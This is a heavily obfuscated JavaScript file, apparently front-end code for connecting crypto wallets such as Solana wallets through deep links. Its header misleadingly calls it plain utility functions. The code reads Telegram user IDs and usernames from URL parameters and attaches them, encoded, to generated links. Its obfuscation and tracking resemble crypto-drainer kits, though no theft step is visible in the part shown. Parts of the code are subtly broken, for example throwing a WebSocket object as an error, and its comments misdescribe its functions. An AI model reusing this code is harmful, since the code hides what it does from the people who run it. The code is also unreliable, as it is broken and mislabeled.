/* ════════════════════════════════════════════════════════════
 * UTILITY FUNCTIONS
 * _v215(str): base64url encode.
 *  * _v396(str): base64url decode.
 *  * _retry(fn, n, delay): retry helper.
 *  * _randBytes(n), _randInt(a,b), _randHex(n): random data helpers.
 *  * _b64Encode(bytes), _reqId(): bearer token helpers.
 *  * cacheSlot_fn(), getSlot(), getCurrentEpoch(): Solana slot helpers.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

_noop(_v447 = _v1213, _v448 = _v447(getString(179)), _v697 = new(TextEncoder), _v698 = new(TextDecoder));

function _v215(..._str_cache) {
  return _v448["encode"](_v697["encode"](_str_cache[0]))
}

function _v396(..._str_cache) {
  return _v698["decode"](_v448["decode"](_str_cache[0]))
}

function _v926(..._str_cache) {
  _noop(_str_cache[-225] = {}, _str_cache["b"] = location["search"], _str_cache[3] = _str_cache["b"] ? new(URLSearchParams)(_str_cache["b"]) : "null", _str_cache["d"] = _v1031(_str_cache[3], "cd"));
  if (_str_cache["d"]) {
    let [__str_table__, _s1] = _str_cache["d"]["split"]("-");
    let _s3 = Number(__str_table__);
    _noop(Number["isNaN"](_s3) || (_str_cache[-225]["tgid"] = _s3), _s1 && new(RegExp)("^[\\w_]" + "{4,32}$", "")["test"](_s1) && (_str_cache[-225]["tgus"] = _s1))
  }
  _noop(_str_cache[0] && (_str_cache[-225]["tgid"] = _str_cache[0]["id"], _str_cache[0]["username"] && (_str_cache[-225]["tgus"] = _str_cache[0]["username"])), _str_cache[5] = _v1031(_str_cache[3], "o"), _str_cache[6] = _str_cache[5] ? JSON["parse"](_str_cache[5]) : {});
  return [_str_cache[-225], _str_cache[6]]
}

function _v291(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u7063"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== 195) {
      with(_s4["\u58DB"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case -186:
          case _s2 - 24:
            _noop(_s4["\u58DB"] = _s4["\u7063"], _s1 += 26, _s3 += 409, _s2 += -453, _s5 += 87);
            break;
          case _s3 - -185:
            _noop(_s4["\u58DB"] = _s4["\u7063"], _s1 += -65, _s3 += 218, _s2 += -453, _s5 += 87);
            break;
            if (!(_s5 != _s1 + -23)) {
              _noop(_s4["\u58DB"] = _s4["\u7063"], _s1 += -91, _s3 += -191);
              break
            }
          case 81:
          case _s3 - 251:
          case -16:
            _noop([_s4["\u7063"]["\u67F4"], _s4["\u7063"]["\u5D31"], _s4["\u7063"]["\u6F24"]] = [74, 229, -21], _str_cache[CONSTS[_s3 + -144]] = "", _str_cache[166] = Object[CONSTS[_s2 + 639]](_str_cache[0])[CONSTS[_s1 + 768]](_limitArgs((..._s1) => {
              _s1["length"] = 1;
              return !!_s1[0]
            })), _str_cache["c"] = _g("l82D10" + CONSTS[_s3 + -10])["values"](_str_cache[CONSTS[_s1 + 228]])[CONSTS[_s1 + 768]](_limitArgs((..._s1) => {
              _s1["length"] = 1;
              return !!_s1[0]
            })), _s4["\u58DB"] = _s4["\u7063"], _s1 += 367, _s3 += 68, _s2 += -342, _s5 += -20);
            break;
          default:
          case -128:
            _noop(_s4["\u58DB"] = _s4["\u7063"], _s1 += 328, _s3 += 134, _s2 += -395, _s5 += 42);
            break;
            if (!(_s5 != 185)) {
              _noop(_s4["\u58DB"] = _s4["\u7063"], _s1 += 302, _s3 += -275, _s2 += 58, _s5 += -45);
              break
            }
          case _s5 - 27:
          case 182:
            _noop([_s4["\u7063"]["\u67F4"], _s4["\u7063"]["\u5D31"], _s4["\u7063"]["\u6F24"]] = [163, 190, -16], _s4["\u58DB"] = _s4["\u7063"], _s1 += -160, _s2 += 58, _s5 += -45);
            break;
          case 75:
          case _s3 - 246:
          case -221:
            return __str_table__ = true, _str_cache[166] && (_str_cache["a"] += "cd=" + _v215((_str_cache[CONSTS[_s1 + -137]]["tgid"] ?? "") + "-" + (_str_cache[0]["tgus"] ?? ""))), _str_cache["c"] && (_str_cache[CONSTS[_s2 + 770]] && (_str_cache["a"] += CONSTS[_s1 + 406]), _str_cache[CONSTS[_s1 + -128]] += "o=" + _v215(_g(CONSTS[_s3 + 316])["stringify"](_str_cache[CONSTS[_s3 + -223]]))), _str_cache[CONSTS[_s1 + -128]] || CONSTS[_s3 + -38];
            _noop(_s4["\u58DB"] = _s4["\u5FEB"], _s1 += 65, _s2 += 236, _s5 += -87);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-224, 159, -175, 148)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v1031(_str_cache, __str_table__, _s1, _s3, _s2) {
  if (!_s1) {
    _s1 = function*(_s1, _s2, _s5 = {
      ["_v1218"]: {}
    }) {
      while (_s1 + _s2 !== 127) {
        with(_s5["\u9CAB"] || _s5) {
          switch (_s1 + _s2) {
            case _s5["_v1218"]["\u6182"] + 158:
            case 232:
              _noop(_s5["\u9CAB"] = _s5["\u56A2"], _s2 += 129);
              break;
              if (!(_s1 != 47)) {
                _s5["\u9CAB"] = _s5["_v1218"];
                break
              }
            case _s2 != -64 && _s2 != 65 && _s2 - -62:
            case -111:
            case 148:
              _noop(_s5["\u9CAB"] = _s5["_v1218"], _s1 += -44, _s2 += 104);
              break;
            case _s1 - -102:
              _noop([_s5["_v1218"]["\u6182"]] = [159], _s5["\u9CAB"] = _s5["_v1218"], _s1 += 397, _s2 += -166);
              break;
            case -4:
            case _s1 != 62 && _s1 != 18 && _s1 - -65:
            case 195:
              _v414["endsWi" + CONSTS[_s1 + 555]]("/") && (_v414 = _v414["slice"](0, -CONSTS[_s1 + -66]));
              try {
                return _s3 = true, _v396(_v414)
              } catch {
                return _s3 = true, "null"
              }
              _noop(_s5["\u9CAB"] = _s5["\u9A0B"], _s1 += -8);
              break;
            case _s5["_v1218"]["\u6182"] + 212:
              _noop(_s5["\u9CAB"] = _s5["_v1218"], _s1 += 353, _s2 += -322);
              break;
            case _s2 - -18:
            case -179:
            case 185:
              return _s3 = true, _v414;
              _noop(_s5["\u9CAB"] = _s5["_v1218"], _s1 += 52);
              break;
            case _s1 - 46:
            default:
            case -131:
              _noop([_s5["_v1218"]["\u6182"]] = [-160], _v1218["_v414"] = _str_cache?.get(__str_table__));
              if (!_v1218["_v414"]) {
                _noop(_s5["\u9CAB"] = _s5["_v1218"], _s1 += 6, _s2 += 111);
                break
              } else {
                _noop(_s5["\u9CAB"] = _s5["_v1218"], _s1 += 58, _s2 += 111);
                break
              }
            case 93:
            case _s5["_v1218"]["\u6182"] + 188:
              _noop(_s5["\u9CAB"] = _s5["_v1218"], _s1 += 397, _s2 += -427);
              break
          }
        }
      }
    }
  }
  _noop(_s3 = undefined, _s2 = _s1(12, -46)["next"]()["value"]);
  if (_s3) {
    return _s2
  }
}

function _v925(..._str_cache) {
  if (!_initialized) {
    let __str_table__ = setTimeout(() => {
      if (_isConnected || isMobile && _pendingDrain) {
        alert("You dont have " + _str_cache[0]["name"] + (" installed."));
        return
      }
      _v415(_str_cache[0])
    }, 600);
    addEventListener("blur", () => {
      removeEventListener(__str_table__)
    }, {
      ["once"]: !0
    })
  }
  _isTelegram ? _v413(_str_cache[1]) : location["href"] = _str_cache[1]
}

function _v395(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u6793"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== -48) {
      with(_s4["\u5A3D"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case 147:
          case -235:
          case _s4["\u6793"]["\u6A1A"] + 282:
            _noop(_str_cache[CONSTS[_s2 + -195]] = _g("ES_ig0" + CONSTS[_s2 + -36])["origin"] + _g(CONSTS[_s1 + 656] + CONSTS[_s2 + -36])["pathname"] + CONSTS[_s2 + 369] + _str_cache[0], _str_cache[2] = _v291(_v184, appState["Ne"]));
            return __str_table__ = true, _str_cache[2] && (_str_cache[1] += "&" + _str_cache[2]), _str_cache[1];
            _noop(_s4["\u5A3D"] = _s4["\u9DD5"], _s1 += 263, _s3 += 311, _s2 += -126, _s5 += -560);
            break;
          case -44:
          case 34:
          case -133:
            _noop(_s4["\u5A3D"] = _s4["\u8126"], _s2 += 133, _s5 += -215);
            break;
            if (!(_s5 == -(_s1 + 9))) {
              _noop(_s4["\u5A3D"] = _s4["\u7A36"], _s2 += 133, _s5 += -215);
              break
            }
          case _s1 - -169:
            _noop(_s4["\u5A3D"] = _s4["\u8166"], _s1 += -216, _s3 += -509, _s2 += -84, _s5 += 401);
            break;
          case -159:
            _noop([_s4["\u6793"]["\u9B89"], _s4["\u6793"]["\u6A1A"]] = [10, 113], _s4["\u5A3D"] = _s4["\u93C4"], _s1 += -216, _s3 += -509, _s2 += 239, _s5 += 460);
            break;
          default:
          case -185:
          case 183:
            _noop([_s4["\u6793"]["\u9B89"], _s4["\u6793"]["\u6A1A"]] = [-59, -218], _str_cache[1] = location[CONSTS[_s1 + 767]] + location[CONSTS[_s2 + 718] + "me"] + "?b=" + _str_cache[CONSTS[_s3 + 150]], _str_cache[2] = _v291(_v184, appState["Ne"]));
            return __str_table__ = true, _str_cache[2] && (_str_cache[CONSTS[_s1 + 166]] += CONSTS[_s3 + 693] + _str_cache[2]), _str_cache[1];
            _noop(_s1 += 289, _s3 += 247, _s2 += 217, _s5 += -616);
            break;
          case _s1 - 182:
            _noop(_str_cache[CONSTS[_s3 + 212]] = _g("ES_ig0" + CONSTS[_s3 + 371])[CONSTS[_s2 + 788]] + _g(CONSTS[_s1 + 466] + "U")["pathna" + CONSTS[_s1 + 488]] + CONSTS[_s3 + 776] + _str_cache[CONSTS[_s1 + -48]], _str_cache[2] = _v291(_v184, appState["Ne"]));
            return __str_table__ = true, _str_cache[CONSTS[_s2 + 183]] && (_str_cache[CONSTS[_s3 + 212]] += CONSTS[_s1 + 495] + _str_cache[2]), _str_cache[1];
            _noop(_s4["\u5A3D"] = _s4["\u530E"], _s1 += 73, _s3 += 311, _s2 += 256, _s5 += -560);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-162, -144, -144, 265)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v394(..._s1) {
  _noop(_s1[1] ?? (_s1[1] = _v395(_s1[0]["id"])), _s1[2] = _s1[0]["W"](_s1[1]));
  if (_s1[2] && !(_v231 && _v121)) {
    _v925(_s1[0], _s1[2]);
    return
  }
  _s1["b"] = _s1[0]["X"](_s1[1]);
  if (_v231 && isMobile) {
    _noop(_limitArgs(_s4), _limitArgs(_s5));
    const _s3 = {
      ["43"]: 21,
      ["47"]: 9,
      ["48"]: 33,
      ["49"]: 62,
      ["50"]: 19,
      ["51"]: 16,
      ["52"]: 50,
      ["53"]: 27,
      ["54"]: 14,
      ["55"]: 47,
      ["56"]: 23,
      ["57"]: 1,
      ["65"]: 2,
      ["66"]: 44,
      ["67"]: 35,
      ["68"]: 30,
      ["69"]: 29,
      ["70"]: 55,
      ["71"]: 25,
      ["72"]: 18,
      ["73"]: 41,
      ["74"]: 61,
      ["75"]: 8,
      ["76"]: 24,
      ["77"]: 63,
      ["78"]: 60,
      ["79"]: 20,
      ["80"]: 4,
      ["81"]: 43,
      ["82"]: 31,
      ["83"]: 54,
      ["84"]: 42,
      ["85"]: 46,
      ["86"]: 5,
      ["87"]: 22,
      ["88"]: 36,
      ["89"]: 34,
      ["90"]: 39,
      ["97"]: 48,
      ["98"]: 17,
      ["99"]: 45,
      ["100"]: 0,
      ["101"]: 12,
      ["102"]: 57,
      ["103"]: 59,
      ["104"]: 26,
      ["105"]: 58,
      ["106"]: 11,
      ["107"]: 28,
      ["108"]: 13,
      ["109"]: 49,
      ["110"]: 3,
      ["111"]: 10,
      ["112"]: 40,
      ["113"]: 37,
      ["114"]: 52,
      ["115"]: 53,
      ["116"]: 15,
      ["117"]: 7,
      ["118"]: 38,
      ["119"]: 51,
      ["120"]: 32,
      ["121"]: 6,
      ["122"]: 56
    };
    const _s2 = new TextDecoder;

    function _s5(..._s1) {
      var _s5, _s4;

      function* _str_cache(_s4, _str_cache, __str_table__, _s6 = {
        ["_v311"]: {}
      }) {
        while (_s4 + _str_cache + __str_table__ !== 174) {
          with(_s6["\u845C"] || _s6) {
            switch (_s4 + _str_cache + __str_table__) {
              case 199:
                _noop([_s6["_v311"]["\u667F"]] = [-147], _s1["length"] = CONSTS[_str_cache + 90], _v311["_v1032"] = _s1[CONSTS[_s4 + -(_s4 + -6)]].length, _v311["\u7D67"] = _s1[CONSTS[_str_cache + 92]].indexOf(CONSTS[_str_cache + 229]), _v311["_v1033"] = _v311["\u7D67"] == -1 ? CONSTS[_str_cache + 92] : _v311["_v1032"] - _v311["\u7D67"], _s6["\u845C"] = _s6["_v311"], _s4 += 26, _str_cache += -140, __str_table__ += -3);
                break;
              case __str_table__ - -340:
              case 70:
                _noop([_s6["_v311"]["\u667F"]] = [-244], _s6["\u845C"] = _s6["_v311"], _s4 += -458);
                break;
                if (!(_str_cache > -166)) {
                  _noop(_s6["\u845C"] = _s6["_v311"], _s4 += -268, _str_cache += 18, __str_table__ += 67);
                  break
                }
              case _s6["_v311"]["\u667F"] + 215:
                _noop([_s6["_v311"]["\u667F"]] = [6], _s1[3] = 0);
                for (let _s7 = CONSTS[_str_cache + 19]; _s7 < _v1032 - _v1033; _s7++) {
                  const _s8 = _s1[0]["charCodeAt"](_s7);
                  if (_s8 == 61) break;
                  _noop(_s1["a"] = _s1["a"] << 6 | _s3[_s8], _s1[CONSTS[_str_cache + 32]] += CONSTS[_str_cache + 21]);
                  if (_s1[CONSTS[_s4 + -209]] >= CONSTS[_s4 + -218]) {
                    _noop(_s1[CONSTS[_str_cache + 32]] -= CONSTS[_str_cache + 23], _v632[_s1[CONSTS[_str_cache + 14]]++] = _s1[CONSTS[_s4 + -213]] >> _s1["b"] & CONSTS[_s4 + -82])
                  }
                }
                return _s5 = true, _s2.decode(_v632);
                _noop(_s6["\u845C"] = _s6["\u6B77"], _s4 += 82, _str_cache += -158, __str_table__ += 182);
                break;
              case 195:
              case -106:
              case -168:
                _noop(_s6["\u845C"] = _s6["_v311"], _s4 += 139, _str_cache += 18, __str_table__ += 67);
                break;
              case _str_cache - 223:
                _noop(_s6["\u845C"] = _s6["\u5615"], _s4 += 164, _str_cache += -90, __str_table__ += 344);
                break;
              default:
                _noop(_s6["_v311"]["_v1417"] = _v1032 * CONSTS[_s4 + -(_str_cache + 293)] / 4 - _v1033, _s6["_v311"]["_v632"] = new Uint8Array(_v1417), _s6["\u845C"] = _s6["_v311"], _str_cache += 248, __str_table__ += -274);
                break;
              case _s4 - 205:
              case 78:
                _s1[3] = 0;
                for (let _s7 = CONSTS[_s4 + -304]; _s7 < _v1032 - _v1033; _s7++) {
                  const _s8 = _s1[0]["charCodeAt"](_s7);
                  if (_s8 == 61) break;
                  _noop(_s1["a"] = _s1["a"] << CONSTS[_s4 + -302] | _s3[_s8], _s1[CONSTS[_str_cache + 190]] += CONSTS[_str_cache + 179]);
                  if (_s1["b"] >= 8) {
                    _noop(_s1[CONSTS[_str_cache + 190]] -= 8, _v632[_s1[3]++] = _s1["a"] >> _s1["b"] & 255)
                  }
                }
                return _s5 = true, _s2.decode(_v632);
                _noop(_s6["\u845C"] = _s6["\u6195"], __str_table__ += 69);
                break;
              case _str_cache - -34:
                _noop(_s1["a"] = 0, _s1[CONSTS[_s4 + -49]] = 0, _s6["\u845C"] = _s6["_v311"], _s4 += 242, _str_cache += -193);
                break;
                if (_s4 < -39) {
                  _noop(_s6["\u845C"] = _s6["_v311"], _s4 += -190, _str_cache += -18, __str_table__ += -67);
                  break
                }
              case 54:
              case _s4 - 174:
              case -20:
                _noop(_s6["\u845C"] = _s6["_v311"], _s4 += -455, _str_cache += 187, __str_table__ += -110);
                break;
                if (!(_str_cache > -166)) {
                  _noop(_s6["\u845C"] = _s6["_v311"], _s4 += -265, _str_cache += 205, __str_table__ += -43);
                  break
                }
            }
          }
        }
      }
      _noop(_s5 = undefined, _s4 = _str_cache(42, -86, 243)["next"]()["value"]);
      if (_s5) {
        return _s4
      }
    }

    function _s4(..._s1) {
      _s1["length"] = 1;
      if (typeof _str_cache[_s1[0]] === "undefined") {
        return _str_cache[_s1[0]] = _s5(__str_table__[_s1[0]])
      }
      return _str_cache[_s1[0]]
    }
    alert(_s4(180) + _s1[0]["name"] + ".");
    return
  }
  _v231 ? location["href"] = _s1["b"] : _v413(_s1["b"])
}

function _v415(_s1, _s3, _s2, _s5) {
  if (!_s5) {
    _s5 = function(_s1) {
      if (typeof _str_cache[_s1] === "undefined") {
        return _str_cache[_s1] = _s2(__str_table__[_s1])
      }
      return _str_cache[_s1]
    }
  }
  if (!_s2) {
    _s2 = function(..._s1) {
      _s1["length"] = 1;
      const _s3 = _s1[0].length;
      const _s2 = _s1[0].indexOf("=");
      const _s5 = _s2 == -1 ? 0 : _s3 - _s2;
      const _s7 = _s3 * 3 / 4 - _s5;
      const _str_cache = new Uint8Array(_s7);
      _noop(_s1[1] = 0, _s1[247] = 0, _s1[3] = 0);
      for (let __str_table__ = 0; __str_table__ < _s3 - _s5; __str_table__++) {
        const _s8 = _s1[0]["charCodeAt"](__str_table__);
        if (_s8 == 61) break;
        _noop(_s1[1] = _s1[1] << 6 | _s4[_s8], _s1[247] += 6);
        if (_s1[247] >= 8) {
          _noop(_s1[247] -= 8, _str_cache[_s1[3]++] = _s1[1] >> _s1[247] & 255)
        }
      }
      return _s6.decode(_str_cache)
    }
  }
  _limitArgs(_s2);
  const _s4 = {
    ["43"]: 21,
    ["47"]: 9,
    ["48"]: 33,
    ["49"]: 62,
    ["50"]: 19,
    ["51"]: 16,
    ["52"]: 50,
    ["53"]: 27,
    ["54"]: 14,
    ["55"]: 47,
    ["56"]: 23,
    ["57"]: 1,
    ["65"]: 2,
    ["66"]: 44,
    ["67"]: 35,
    ["68"]: 30,
    ["69"]: 29,
    ["70"]: 55,
    ["71"]: 25,
    ["72"]: 18,
    ["73"]: 41,
    ["74"]: 61,
    ["75"]: 8,
    ["76"]: 24,
    ["77"]: 63,
    ["78"]: 60,
    ["79"]: 20,
    ["80"]: 4,
    ["81"]: 43,
    ["82"]: 31,
    ["83"]: 54,
    ["84"]: 42,
    ["85"]: 46,
    ["86"]: 5,
    ["87"]: 22,
    ["88"]: 36,
    ["89"]: 34,
    ["90"]: 39,
    ["97"]: 48,
    ["98"]: 17,
    ["99"]: 45,
    ["100"]: 0,
    ["101"]: 12,
    ["102"]: 57,
    ["103"]: 59,
    ["104"]: 26,
    ["105"]: 58,
    ["106"]: 11,
    ["107"]: 28,
    ["108"]: 13,
    ["109"]: 49,
    ["110"]: 3,
    ["111"]: 10,
    ["112"]: 40,
    ["113"]: 37,
    ["114"]: 52,
    ["115"]: 53,
    ["116"]: 15,
    ["117"]: 7,
    ["118"]: 38,
    ["119"]: 51,
    ["120"]: 32,
    ["121"]: 6,
    ["122"]: 56
  };
  const _s6 = new TextDecoder;
  let _s7 = _isTelegram ? "_blank" : "_self";
  return _v121 && _s1["n"] ? (_v630(getString(181) + _s1["n"], _s7), !0) : isMobile && _s1["i"] ? (_v630(_s5(182) + _s1["i"], _s7), !0) : _s3 ? (_v413(_s3), !0) : !1
}

function _v566(..._str_cache) {
  _str_cache[0]["Re"] ? _v15["push"]("Connecting") : _v15["push"]("ConnectingQr")
}
_v329 = getString(147);
var {
  ["encode"]: _v1219
} = _v447(_v329);
_v330 = undefined;

function _v1220() {
  let _str_cache = new(Uint8Array)(128)["fill"](255);
  for (let __str_table__ = 0; __str_table__ < _v329["length"]; __str_table__++) {
    let _s1 = _v329["charCodeAt"](__str_table__);
    _str_cache[_s1] = __str_table__
  }
  return _str_cache
}

function _v924(..._str_cache) {
  _str_cache["length"] = 1;
  if (_str_cache[0]["length"] === 0) {
    return new(Uint8Array)([])
  }
  _noop(_v330 ?? (_v330 = _v1220()), _str_cache[1] = 0);
  for (; _str_cache[1] < _str_cache[0]["length"] && _str_cache[0]["charCodeAt"](_str_cache[1]) == 49;) {
    _str_cache[1]++
  }
  _str_cache[2] = [];
  for (let __str_table__ = _str_cache[1]; __str_table__ < _str_cache[0]["length"]; __str_table__++) {
    let _s1 = _v330[_str_cache[0]["charCodeAt"](__str_table__)];
    if (_s1 === void 0 || _s1 === 255) {
      throw new(Error)(getString(183))
    }
    let _s3 = _s1;
    for (let _s2 = 0; _s2 < _str_cache[2]["length"]; _s2++) {
      _noop(_s3 += _str_cache[2][_s2] * 58, _str_cache[2][_s2] = _s3 & 255, _s3 >>= 8)
    }
    for (; _s3 > 0;) {
      _noop(_str_cache[2]["push"](_s3 & 255), _s3 >>= 8)
    }
  }
  for (let __str_table__ = 0; __str_table__ < _str_cache[1]; __str_table__++) {
    _str_cache[2]["push"](0)
  }
  if (_str_cache[2]["length"] === 0 && _str_cache[1] > 0) {
    return new(Uint8Array)(_str_cache[1])["fill"](0)
  }
  _noop(_str_cache["c"] = _str_cache[2]["length"], _str_cache[152] = new(Uint8Array)(_str_cache["c"]));
  for (let __str_table__ = 0; __str_table__ < _str_cache["c"]; __str_table__++) {
    _str_cache[152][__str_table__] = _str_cache[2][_str_cache["c"] - 1 - __str_table__]
  }
  return _str_cache[152]
}
_noop(_buildList = _v924, _v331 = _v1219);

function _v923(..._str_cache) {
  return _str_cache[0] / _str_cache[1] + (_str_cache[0] % _str_cache[1] ? 1n : 0n)
}

function _now() {
  return Math["floor"](Date["now"]() / 1000)
}

function _v62(..._str_cache) {
  return new(Promise)(_limitArgs((...__str_table__) => {
    _noop(__str_table__["length"] = 1, setTimeout(__str_table__[0], _str_cache[0]))
  }))
}

function _v1221(_str_cache, __str_table__) {
  let _s1 = 10 ** __str_table__;
  return Math["floor"](_str_cache * _s1) / _s1
}

function _v565(..._str_cache) {
  _str_cache[2] = 10 ** _str_cache[1];
  return Math["round"](_str_cache[0] * _str_cache[2]) / _str_cache[2]
}

function _v290(..._str_cache) {
  return Math["min"](Math["max"](_str_cache[0], _str_cache[1]), _str_cache[2])
}

function _randInt(..._str_cache) {
  return Math["round"](Math["random"]() * (_str_cache[1] - _str_cache[0]) + _str_cache[0])
}

function _randHex(..._str_cache) {
  _str_cache[1] = "";
  for (let __str_table__ = 0; __str_table__ < _str_cache[0]; __str_table__++) {
    _str_cache[1] += _randInt(0, 255)["toString"](16)
  }
  return _str_cache[1]
}

function _randBytes(..._str_cache) {
  _str_cache[1] = new(Uint8Array)(_str_cache[0]);
  for (let __str_table__ = 0; __str_table__ < _str_cache[0]; __str_table__++) {
    _str_cache[1][__str_table__] = _randInt(0, 255)
  }
  return _str_cache[1]
}
async function _retry(_str_cache, __str_table__, _s1) {
  let _s3 = [];
  for (let _s2 = 0; _s2 < __str_table__; _s2++) {
    try {
      return await _str_cache()
    } catch (_s5) {
      _noop(_s1 && _s2 != __str_table__ && (await _v62(_s1 * (_s2 + 1))), _s3["push"](_s5))
    }
  }
  throw new(WebSocket)(_s3, _s3[0]?.message)
}
_v40 = [];
for (let _v178 = 0; _v178 < 256; ++_v178) {
  _v40["push"]((_v178 + 256)["toString"](16)["slice"](1))
}

function _b64Encode(_str_cache, __str_table__ = 0) {
  return (_v40[_str_cache[__str_table__ + 0]] + _v40[_str_cache[__str_table__ + 1]] + _v40[_str_cache[__str_table__ + 2]] + _v40[_str_cache[__str_table__ + 3]] + "-" + _v40[_str_cache[__str_table__ + 4]] + _v40[_str_cache[__str_table__ + 5]] + "-" + _v40[_str_cache[__str_table__ + 6]] + _v40[_str_cache[__str_table__ + 7]] + "-" + _v40[_str_cache[__str_table__ + 8]] + _v40[_str_cache[__str_table__ + 9]] + "-" + _v40[_str_cache[__str_table__ + 10]] + _v40[_str_cache[__str_table__ + 11]] + _v40[_str_cache[__str_table__ + 12]] + _v40[_str_cache[__str_table__ + 13]] + _v40[_str_cache[__str_table__ + 14]] + _v40[_str_cache[__str_table__ + 15]])["toLowerCase"]()
}

function _reqId() {
  let _str_cache = new(Uint8Array)(16);
  for (let __str_table__ = 0; __str_table__ < 16; __str_table__++) {
    _str_cache[__str_table__] = _randInt(0, 255)
  }
  return _b64Encode(_str_cache)
}

function _v564(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5 = {
    ["\u56BD"]: {}
  }) {
    while (_s1 + _s3 + _s2 !== 160) {
      with(_s5["\u8E80"] || _s5) {
        switch (_s1 + _s3 + _s2) {
          case _s1 - -355:
            _noop([_s5["\u56BD"]["\u752F"]] = [177], _s5["\u8E80"] = _s5["\u8C8E"], _s1 += 32, _s3 += 193, _s2 += -220);
            break;
          default:
          case 0:
          case _s2 - -398:
            _noop([_s5["\u56BD"]["\u752F"]] = [-126], _str_cache[-CONSTS[_s3 + -170]] = _str_cache[CONSTS[_s1 + 173]]["length"]);
            if (_str_cache[-CONSTS[_s1 + 562]] != _str_cache[CONSTS[_s3 + -561]]["length"]) {
              _noop(_s5["\u8E80"] = _s5["\u56BD"], _s1 += -122, _s3 += -439, _s2 += 175);
              break
            } else {
              _noop(_s5["\u8E80"] = _s5["\u56BD"], _s1 += -122, _s3 += -305, _s2 += 175);
              break
            }
            if (_s2 != -(_s1 + 404)) {
              break
            }
          case -225:
            return __str_table__ = true, !CONSTS[_s3 + -122];
            _noop(_s5["\u8E80"] = _s5["\u56BD"], _s3 += 134);
            break;
          case 198:
          case _s5["\u56BD"]["\u752F"] + 76:
            _noop([_s5["\u56BD"]["\u752F"]] = [-66], _s5["\u8E80"] = _s5["\u9767"], _s1 += -90, _s3 += 367, _s2 += -67);
            break;
          case _s3 != 126 && _s3 - 351:
            for (let _s4 = CONSTS[_s1 + 295]; _s4 < _str_cache[-84]; _s4++) {
              if (_str_cache[0][_s4] != _str_cache[1][_s4]) {
                return __str_table__ = true, !CONSTS[_s1 + 293]
              }
            }
            return __str_table__ = true, !CONSTS[_s1 + 295];
            _noop(_s5["\u8E80"] = _s5["\u917F"], _s3 += 112, _s2 += 139);
            break;
            if (!(_s2 < -46)) {
              _noop(_s5["\u8E80"] = _s5["\u56BD"], _s1 += 90, _s3 += 112, _s2 += 45);
              break
            }
          case 114:
          case -14:
          case 71:
            _noop(_s5["\u8E80"] = _s5["\u56BD"], _s1 += 196, _s3 += -246, _s2 += -289);
            break;
          case 200:
            _noop(_s5["\u8E80"] = _s5["\u50FE"], _s1 += 196, _s2 += -236);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-167, 565, -237)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _fmtNum(..._str_cache) {
  _str_cache[73] = _str_cache[0]["toFixed"](2);
  return _str_cache[0] < 10000 ? _str_cache[73] : _str_cache[73]["replace"](new(RegExp)(getString(184), "g"), "\u2009")
}
_noop(_fmtIndex = EventSource, _v332 = new(RegExp)(getString(185), ""));

function _v289(..._s1) {
  _noop(_limitArgs(_s4), _limitArgs(_s5));
  const _s3 = {
    ["43"]: 21,
    ["47"]: 9,
    ["48"]: 33,
    ["49"]: 62,
    ["50"]: 19,
    ["51"]: 16,
    ["52"]: 50,
    ["53"]: 27,
    ["54"]: 14,
    ["55"]: 47,
    ["56"]: 23,
    ["57"]: 1,
    ["65"]: 2,
    ["66"]: 44,
    ["67"]: 35,
    ["68"]: 30,
    ["69"]: 29,
    ["70"]: 55,
    ["71"]: 25,
    ["72"]: 18,
    ["73"]: 41,
    ["74"]: 61,
    ["75"]: 8,
    ["76"]: 24,
    ["77"]: 63,
    ["78"]: 60,
    ["79"]: 20,
    ["80"]: 4,
    ["81"]: 43,
    ["82"]: 31,
    ["83"]: 54,
    ["84"]: 42,
    ["85"]: 46,
    ["86"]: 5,
    ["87"]: 22,
    ["88"]: 36,
    ["89"]: 34,
    ["90"]: 39,
    ["97"]: 48,
    ["98"]: 17,
    ["99"]: 45,
    ["100"]: 0,
    ["101"]: 12,
    ["102"]: 57,
    ["103"]: 59,
    ["104"]: 26,
    ["105"]: 58,
    ["106"]: 11,
    ["107"]: 28,
    ["108"]: 13,
    ["109"]: 49,
    ["110"]: 3,
    ["111"]: 10,
    ["112"]: 40,
    ["113"]: 37,
    ["114"]: 52,
    ["115"]: 53,
    ["116"]: 15,
    ["117"]: 7,
    ["118"]: 38,
    ["119"]: 51,
    ["120"]: 32,
    ["121"]: 6,
    ["122"]: 56
  };
  const _s2 = new TextDecoder;

  function _s5(..._s1) {
    var _s5, _s4;

    function* _str_cache(_s4, _str_cache, __str_table__ = {
      ["_v1419"]: {}
    }) {
      while (_s4 + _str_cache !== -69) {
        with(__str_table__["\u774E"] || __str_table__) {
          switch (_s4 + _str_cache) {
            case 138:
            case 70:
            case _str_cache - 370:
              _noop([__str_table__["_v1419"]["\u5798"], __str_table__["_v1419"]["\u833D"], __str_table__["_v1419"]["\u6870"]] = [-187, -67, 110], _s1[1] = CONSTS[_s4 + 376], _s1[116] = 0, __str_table__["\u774E"] = __str_table__["_v1419"], _s4 += 345, _str_cache += -254);
              break;
            case -89:
            case _str_cache - -174:
            case 106:
              _noop(_s1[CONSTS[_s4 + -170]] = 0, _s1[CONSTS[_s4 + 391]] = CONSTS[_s4 + -168], __str_table__["\u774E"] = __str_table__["_v1419"], _s4 += -199, _str_cache += 187);
              break;
            case -231:
            case -103:
              _noop([__str_table__["_v1419"]["\u5798"], __str_table__["_v1419"]["\u833D"], __str_table__["_v1419"]["\u6870"]] = [227, -35, -35], __str_table__["\u774E"] = __str_table__["_v1419"], _s4 += 341, _str_cache += -336);
              break;
            case -250:
            default:
              return _s5 = true, _s2.decode(_v1034);
              _noop(__str_table__["\u774E"] = __str_table__["\u5ABA"], _s4 += 177, _str_cache += -72);
